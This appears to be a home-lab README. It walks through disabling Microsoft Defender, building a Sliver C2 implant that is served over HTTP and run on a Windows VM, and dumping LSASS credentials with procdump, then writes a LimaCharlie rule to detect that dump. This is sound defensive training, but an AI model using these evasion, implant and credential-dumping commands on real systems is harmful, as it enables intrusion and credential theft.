# HomeLab
This home lab demonstrates an attack and defense scenario that implements an EDR response using LimaCharlie on a Windows Machine against  Silver (attack ) from a C2 machine (Ubunutu). 

<h2> Set up the virtual Environment</h2>
i. We will download and install the free VMare Workstation pro provided by Broadcom. You will need to create an account.

<br>ii. You will then need to download Download the Ubuntu Server installer ISO. It must be the Ubunutu SERVER version as it comes with the preinstalled packages needed. 

<br> The specs for the machine should be 14GB Disk, customize the hardware to 3 CPU cores and 2GB Ram.

<br> During the install leave defaults, when prompt Installer update available click "Continue without updating".

<br>iii. Once you reach the Network connections you want to find and set a static IP address for the VM so it does not change during the lab or anytime after.  You will need navigate to "Edit" on top of the VM Workstation, Click "Vitrual Network Editor", select the "Type:NAT" network and click "NAT Settings". You should copy down the subnet and gateway IP.

<br>iv. On the Ubuntu installer change from the DHCPv4 > edit the IPv4 > manual. You will then  input the Subnet IP address with the subnet, Address (DHCPv4) provided, gateway IP and a name servers 8.8.8.8

<br>v.  Onces down you will need to create a memorable username/password for this lab. Then install OpenSSH server by checking the box after.

<br>vi. Click enter on Reboot Now when the install says it is completed... If its stays on "removing the CDROM" press "Enter".

<br>vii. After the reboot , login with your username and password so we can making an outbound ping attempt to a DNS, use command...

<br><i>ping -c 2 google.com</i>

REFERENCE TO THESE STEPS and OTHER  FOLLOW THE VIDEO 
https://www.youtube.com/watch?v=oOzihldLz7U




<hr>
<h2>Disabling Microsoft Defender</h3>
<hr>
<i>What is Microsoft Defender?</i>

<br>Microsft Defender is a comprehensive security tool developed by Microsoft to protect against various types of malware and cyber threats. It includes
real-time protection, firewall and network protection, device performance monitoring and more. 

<i>Why do we need to disable Microsoft Defender for this lab?</i>

<br><b> **Disclaimer. One should not disable Microsoft Defender on their local machine as it is in place to help keep your local machine protected from cyber attacks.  For demo purposes we will be disabling it on the victims VM.** </b>

<br> Disabling Microsoft Defender on our Windows Machine is imperative for the attack to be successfull. This will allow for our EDR (LimaCharlie) to detect the attack and respond to it. If Microsoft Defender and its features are enabled the attack will face greater challenges to exploit the Windows Machine. Again, for demo. purposes we will disable Microsoft Windows on a virtual machine to demostrate the attack and defense.   

<h3> Steps</h3>
Set up the VM workstation Free personal use 17 pro. Windows Machine, then sign into the machine.

<br>https://www.youtube.com/watch?v=rQHHqUDkf7M&t=24s (VM Workstation )
<br>https://www.youtube.com/watch?v=UB8CQC_lT5U&t=44s (Windows Machine )

<h3> A. Disabling Tamper Protection</h3>
i. On your Windows Machine Click "Start" menu icon.
<br>ii. Click "Settings"
<br>iii. Click "Privacy and Security" 
<br>iv. Click "Windows Security"
<br>v. Click "Virus & Threat protection"
<br>vi. Underneath the "Virus & Threat protection settings" click "Manage Settings"
<br>vii. Toggle OFF the "Tamper protection" switch. When prompted click yes to allow the changes.

<br>![Screenshot (78)](https://github.com/user-attachments/assets/11c5d2c9-829f-4c22-8c43-2b2a225d0f04)

<br>VIII. Continue to toggle OFF ever other option here, then close the window we opened.

<h3>B. Disable Defender via Group Policy Editor</h3>
i. Click on "Start" menu icon.
<br>ii. In the search bar type "cmd" and right click to "Run as administrator" then run the command "gpedit.msc"
<br>iii. Once prompted , click Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus
<br>iv. Double-click "Turn off Microsoft Defender Antivirius", then select "Enabled" > Click "Apply" > Click "OK"

<br>![Screenshot (79)](https://github.com/user-attachments/assets/ab0d1ab4-e480-46ef-8e26-5e8cdacd79be)

<br> <i>** Enabling the policy will make it so that Microsoft Defenders Antivirius does not run and will not scan for malware and other unneeded software.  </i>

<h3>C. Perm. disable Defender via Registry </h3>
i. From the same command terminal , enter the command.

<br><i> REG ADD "hklm\software\policies\microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f </i>

<h3> Prepare to boot into "Safe Mode" to disable all Defender services</h3>
i. Click "Start" menu icon
<br>ii. Type "msconfig" into the search bar within the Start Menu
<br>iii. Navigate to the "Boot" tab and select "Boot Options", from there you wil click the "Safe Boot" box leaving the "Minimal" button enabled. 
<br>iv. Click "Apply" > "OK". 

<br>![Screenshot (80)](https://github.com/user-attachments/assets/cda91548-4fa0-43bc-877b-7caaa7b42b81)



<br>v.Allow the System to "Restart" in Safe Mode and re-sign in. Once signed in you will notice the save mode at the corner of the Machines. 

<h3>Disabling services via the Registry while in Safe Mode</h3>
i. Click the "Start" menu icon
<br>ii. Search for "regedit" in the search menu. 
<br>iii. For each registry location you will need to browse to the key, "Start" value and change each one to 4. The registrys path you will need to follow is >  Computer\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services...

<br> each will end in >  \Sense; \WdBoot; \ WindDefend; \WdNisDrv; \WdNisSvc; \WdFilter

<br>![Screenshot (81)](https://github.com/user-attachments/assets/9f687111-895b-4b32-8b9e-ff6224ec7788)

<br>iv. We will then go back into "msconfig" from the "Start Menu" icon and uncheck the "Safe boot" checkbox. Apply > OK and allow the sytem to restart. Microsoft Defender should no longer be on the System. 

<br>![Screenshot (82)](https://github.com/user-attachments/assets/16349792-c787-4241-8be2-fe0ffa6b9d05)

<h3>Prevent the Window VM from going into standby</h3>
i. Open a "cmd" in "Run as admin." and input the following commands. 

<br>powercfg /change standby-timeout-ac 0
<br>powercfg /change standby-timeout-dc 0
<br>powercfg /change monitor-timeout-ac 0
<br>powercfg /change monitor-timeout-dc 0
<br>powercfg /change hibernate-timeout-ac 0
<br>powercfg /change hibernate-timeout-dc 0

<h2>Installing Sysmon</h2>
<hr>
<i>What is Sysmon ?</i>
<br> Sysmon or System Monitor is a windows system service and device driver that logs system activity to the Windows event log such as process creation, network connections and file creation.

<br>i. We first want to launch an Admin. Powershell  on our Windows VM and then download Sysmon with the following command.
<br><i>Invoke-WebRequest -Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip</i>

<br>ii. We will then unzip the Sysmon.zip with the command...
<br><i>Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon</i>

<br>iii. Next we will download SwiftOnSecurity's Sysmon config.
<br><i>Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml</i>

<br>iv. We will then install Sysmon with Swift config.
<br><i>C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml</i>

<br>v. Lets validate that we have Sysmon64 service installed.
<br><i>Get-Service sysmon64</i>

<br>vi.Lastly, we will check for the presence of Sysmon Event Logs. 
<br><i>Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10</i>

<hr>


<h2>Installing LimaCharlie EDR on the Windows VM</h2>
<hr>
<i> What is LimaCharlie </i>

<br> A SecOps cloud-based security tool and infrastructure

<h3>Setting up LimaCharlie</h3>
i. Go to LimaCharlie website and set up an account. Once the account is set up and questions are answered "Create a new organization"
<br>ii. The name should be unique, "Data Residency Region" should be whatever is closest to you, in this cause for me it is USA. Demo Configuration should be disabled with the "Demo Configuration" "Template" set as "Extended Detection & Response Standard". Then click "Create Organization".

<br>![Screenshot (83)](https://github.com/user-attachments/assets/875dfde1-76ee-4566-9464-84b58014b4d7)

<br>iii. Once the Org. is created you will need to click "Add Sensor". The credentials for this will be as follows. Select "Windows" > provide a description for the key > click "Create" > Select Installation Key and select the key that was just created.

<br>iv. We then will install Windows sensor "x86.64(.exe)"

<br>** Do not click selected installer in step 2 on the website**

<br>![Screenshot (84)](https://github.com/user-attachments/assets/559a3809-fbac-49a1-b9a4-37cc104e6a4f)


<br>v. In the Windows machine you will open a new PowerShell as "Run as Admin." You then will need to enter the following command
<br> "<i> cd :C\Users\User\Downloads</i> " 
<br>**If folder not already created create one in this path**

<br>v. Enter the following command into the terminal. 
<br>Invoke-WebRequest -Uri https://downloads.limacharlie.io/sensor/windows/64 -Outfile C:\Users\User\Downloads\lc_sensor.exe

<br> From here you want to enter the command to shift into the standard command prompt
<br> "<i>cmd.exe</i>"

<br>vi. We then will copy the installer code that is provide from the LimaCharlie website into our terminal
<br>** code maybe mixing the "lc_sensor.exe" before the "-i" in the given installer code. Enter "lc_sensor.exe" prior to pastingn the installer code to ensure it will install properly. 

<br>![Screenshot (85)](https://github.com/user-attachments/assets/efa26cb3-2e08-4ad6-adc5-683dddd4add7)

<h3>Configuring LimaCharlie to ship Sysmon even logs alongside its own EDR telemetry</h3>
i. In your LimaCharlie account, on the leftside of the screen open the "Sensors" tab , find and click "Artifact Collection". 

<br>ii. Navigate to "Artifact Collection Rule" and click "+Add Artifact Collection Rule"

<br>iii. From here you will enter "wel://Microsoft-Windows-Sysmon/Operational:*" as your patterns, "10" will be the Retention Period, and "windows" will be the platform(s). Save the rule. 

<br>iv. Close all windows within your Windows VM machine and save the VM snapchat. This can be found in the VMware Workstation under the VM tab and click "Snapshot"

<hr>

<h2>Setup Attack System (Ubuntu)</h2>
<hr>

i. We should log into our Attack Machine (Ubuntu) and type in command line "sudo su". This command will allow or us to switch to a superuser or root with those privileges. 

<br>ii. We then want to check the the IP address of the machine by entering this command line "ip a". We should see the address under "inet". We also want to take note of the ethernet adapter above it. In our machince instance it says "ens33".

<br>iii. Becuase this IP address is a DHCP assigned IP address, there is a chance that it can change later on. We want to statically assigned the IP to the machine so that it will not change later. 

<br>iii. We must find the IP address of the gatway by using the command "ping _gateway -c 1". An IP address for the gateway should appear after the "PING _gateway" in the terminal. 

<br>iv. We want to configure the file for th network manager "netplan". Type is this command. 
<br><i>sudo nano /etc/netplan/00-installer-config.yaml</i>

<br>v. We then will edit the file by inputting our netowork information as such and save.;
<br>Network:
<br>ethernets:
<br>ens33:
<br>dhcp:no 
<br>addresses: [ YourIP# /Subnet#]
<br>gateway4: GatewayIP#
<br>nameservers:
<br>addresses:[8.8.8.8,...] 
<br> version:2

<br>vi. We will now type in the command "sudo netplan try" > then command "sudo netplan apply" > then check ping to Google DNS with command "ping 8.8.8.8". The IP should now be statically applied and we will now exit the command prompt.

<h2>Setup Attack System part 2.</h2>
We will be using the coommand prompt on our host machine, may it be Linux, Mac, Windows or any other third party tool to start a SSH to our Ubuntu VM. 

<br>i. We will open a command prompt on our host machine and type in 
<br><i> ssh user@Attack_VM_IP</i>

<br>![Screenshot (87)](https://github.com/user-attachments/assets/c5829963-34ed-46ad-a1d2-0e14671d83bf)


<br>ii. After gaining access we will input the command <i> sudo su </i> to help set up our C2 server by dropping us into the root shell.

<br>iii. Our next set of commands will be used to download Sliver, which will be our Command and Control (C2) framework. Follow these commands.

<br> wget https://github.com/BishopFox/sliver/releases/download/v1.5.34/sliver-server_linux -O /usr/local/bin/sliver-server
<br> chmod +x /usr/local/bin/sliver-server
<br> apt install -y mingw-w64

<br>iv. We will now create a directory for future workings
<br> mkdir -p /opt/sliver

<h2> Generate C2 payload</h2>

i. We will begin a SSH session from into our Attack machine as we did earlier using the command ssh user_name@IP_Address > sudo su ( to drop into the rootshell). We will then drop into the root shell and cd into our dir we made for sliver server and then launch sliver using commands...

<br>cd /opt/sliver
<br> sliver-server 

<br>ii. We now will generate a  C2 session payload using are attacks machine static ip address we assigned the VM. Using command below. After the command is compiled it will provide us with a implant of the payload which we will need to confirm. the names for our executables are unique and everyones is different( note this for later). 

<br> generate --http [Linux_VM_IP] --save /opt/sliver

<br>![Screenshot (89)](https://github.com/user-attachments/assets/c03be165-58a9-4924-80b2-18f48c76cd8c)

<br> We now will confirm the implants by using the command "implants". Then "exit" after the implant is confirmed. 

<br>![Screenshot (90)](https://github.com/user-attachments/assets/7591b643-24a5-4066-88ab-3926f69e28e3)

<br>iii. We will now download the C2 payload from our attack machine to the Windows VM using python to spin up a temporary web server. Our commands in our SSH will be as such...
<br> cd /opt/sliver
<br> python3 -m http.server 80

<br> We will then stage our C2 payload using our Attack Machine  IP and the name of the unique payload we created. After staging we will snapshot the VM.

<br> IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe

<br>![Screenshot (91)](https://github.com/user-attachments/assets/5bb31884-44aa-42c7-9c27-a6015d5cba9e)

<h2>We will start and command the control session</h2>
i. Now the payload is on the Windows VM we will switch to our attack machine via the SSH session and enable Sliver HTTP server to call the callback. We first will terminate the python webserver we started ( ctrl + c) then relaunch sliver "sliver-server" is the command.

<br> ii. We will then start Sliver http listener with the command, if an error occurs try rebooting the vm.

<br><i>http</i>

<br>iii. We will now go back to the Windows VM and execute the C2 payload that was downloaded using the same Admin Powershell prompt. The Command is...

<br> C:\Users\User\Downloads\<your_C2-implant>.exe

<br> note in our SSH on the C2 end we have a session on our Sliver server coming from our Windows machine. Verify and take note of your session ID by entering the command "sessions"

<br>iv. To interact with the new C2 session by typing the following command into the Sliver shell with your session id. commond should be ...

<br> use [session_id]

<br>v. We are now able to interact with the C2 session on the Windows VM. Use some basic commands to get our "victims" host information. Use code "info", "whoami", "getprivs","pwd" and even examine network connections occuring on the remote system "netstat"

<br>![Screenshot (92)](https://github.com/user-attachments/assets/00960469-6f94-4a62-aa0f-39828a39dfe2)


<br>![Screenshot (93)](https://github.com/user-attachments/assets/81b55bc6-12c0-4f79-9163-80f31d04fe59)

<br> vi. After typing netstat you should notice a  rphcp.exe executable will is part of LimaCharlie EDR service. We will not identify running process by using the command ps -T. It is important to take note of highlighted red "Sysmon64.exe" and the <i>Security Product(s): Sysmon64 </i> at the bottom of our list. This helps makes attackers aware of what security products a victim system is using.Also notice our implant "EQUAL_THINKING.exe" in green. 

<br>![Screenshot (94)](https://github.com/user-attachments/assets/56caa306-23f6-45e7-97ae-42789021660f)

<h2>Observe EDR Telemetry </h2>

i. Log into your LimaCharlie and then navigate to your organization we made earlier. We will then navigate to the "Sensors List" tab on the left. Then click on the Hostname of our Windows VM

<br>![Screenshot (95)](https://github.com/user-attachments/assets/6abdf6d4-a80e-432f-bf89-15a15adcb6b2)

<br> ii. We will now navigate to "processes" on the bottom left of the tab. As we scroll down we see many proccesses happening on our Windows Machine. It is important to take not of the name of many of the proccess and their unique PID numbers. Many of the process are common to Windows such as "msedge.exe" and "MicrosoftEdgeUpdate.exe" but whats even more important is that even though many of these processes are common they can be used to disguised malicious processes.
<br> * An easy way to spot an unusual processes is by looking to see if it is NOT signed. One must remember that even though the processes is signed, the signed process can still be used to launch malicious processes or code. 
<br> Click the menu icon next to the process we will also be able to navigate to  Network connections of that proccess to see the Source and Destination IP and ports of the process. Simple "ctrl f" and type in either the your implant name or attack IP address.  

<br>![Screenshot (96)](https://github.com/user-attachments/assets/7ae57102-36b9-4d36-b475-f34519657486)

<br>![Screenshot (97)](https://github.com/user-attachments/assets/55dfbf5c-daa6-43ea-91bd-91f1b014bc2f)

<br>iv. Navigating to the "File System" tab we will then be able to traverse through our Windows machines' files and then find the path to our payload that was downloaded onto the system. Click the icon to inspect the HASH we are able to put it into Virustotal to see information regarding the malware we can find. 

<br>** Not putting in the HASH for this malware will not give back any information from VirusTotal becuase we just created it. Also, just becuase no information is given back from VirusTotal during a malware analysis does not mean it does not exsist, you maybe dealing with a NEW malware / virus. **

<br>![Screenshot (98)](https://github.com/user-attachments/assets/b6a82e03-e4f2-4623-89bc-1e60c3517126)

<br>v. Navigate to the "Timeline" tab on the left side of the menu of the sensor and you will be taken to a window that allows for near real-time EDR telemetry and event logs that you can also filter to find proccess such as the implant that was mad. 

<h2>Adversarial</h2>
i. We want to get back into our SSH session on the C2 session of the victim. We will then run the command "getprivs" to find if we have "SeDebugPrivilege" enabled. If it is not you must relaunch your C2 implant with admin rights on the Window Powershell. This is important because it is a power privilege which mean we will likley have access to important information...

<br>ii. We will steal credentials on a system by dumping the lsass.exe process from memory. LSASS stands for the Local Security Authority Subsystem Service. This is critical for Windows operating system as its responsible for enforcing the security policy on the system such as user authentication (logins and passwords), access control and more. 

<br>We will use the command... to dump the process "lsass.exe" into a dump in our C2 server named "lsass.dmp" in an attempted to gain senstive information about passwords and logins. 

<br><i>procdump -n lsass.exe -s lsass.dmp</i>

<br>![Screenshot (99)](https://github.com/user-attachments/assets/7cef5a4c-0786-42ab-8552-cfd35d77e8ef)

<h2>Building Detection and response rules. </h2>

i. Navigate to LimaCharlie and access the timeline. We will input into the filter "SENSITIVE_PROCESS_ACCESS" to find the event type that is common to lsass.exe. We will then click any of the listed process and analysis the events. Notice in event 1 we have a source which is our implant and a target that it is getting, the lsass.exe.  

<br>ii. Once you see this , on the same event log click the small back with the arrow on the top right of the window to build a detection and response rule for the event.

<br>![Screenshot (100)](https://github.com/user-attachments/assets/a53750f4-b847-495c-858e-034a23728a84)

<br>We will now in the detect section of the new rule, remove the old content and replace it with ... 

<br>event: SENSITIVE_PROCESS_ACCESS
<br>op: ends with
<br>path: event/*/TARGET/FILE_PATH
<br>value: lsass.exe 

<br> The detect section rules are let us write a rule to look for and detect only "SENSITIVE_PROCESS_ACCESS" events where the victim or target process end with "lsass.exe". 

<br> We will also replace the "Respond" section with a new rule...

<br>- action: report
<br>  name: LSASS access

<br> The "Respond" rule is  telling LimaCharlie to generate detection reports anytime this detection occurs. 

<br>iii. We will now test the event by clicking, "Target Event" and scrolling down and clicking "Test Event". It should give us a match fitting the parameters of our rule. We will save the rule as "LSASS ACCESSED" and enable it. 

<br> ![Screenshot (101)](https://github.com/user-attachments/assets/776cdade-70d3-4d09-8e6c-1680f89c6fe8)


<br>![Screenshot (102)](https://github.com/user-attachments/assets/9b8bf9eb-e461-4194-9b29-8e47a8c84ccd)


<br>![Screenshot (103)](https://github.com/user-attachments/assets/2fff2ff8-f6a4-48af-8522-db1ccce429dd)

<h2> Detection</h2>

i.Go back into your Attack machine and input the dump command we used earlier 

<br><i>procdump -n lsass.exe -s lsass.dmp</i>

<br>ii.Navigate to the "Sensor" in LimaCharlie and find "Detections". An alert should appear for the rule we created as well as more information about events and time. 

<br>![Screenshot (105)](https://github.com/user-attachments/assets/89c05d94-3556-46a2-8641-b21c11444a11)




